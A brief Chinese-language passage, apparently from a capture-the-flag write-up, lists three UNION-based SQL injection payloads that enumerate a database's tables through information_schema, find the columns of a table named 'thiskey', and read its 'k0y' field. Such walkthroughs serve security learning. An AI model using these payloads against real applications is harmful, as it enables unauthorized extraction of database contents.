分三步走
> 1. `union select table_name,table_schema from information_schema.tables where table_schema = database()` 获得本数据库内所有的表
> 2. `union select 1,column_name from information_schema.columns where table_name = 'thiskey'` 通过上一步得知有一个叫 thiskey 的表, 获得其中的字段
> 3. `union select 1,k0y from thiskey` 通过上一步知道有一个叫 k0y 的字段, 获得其值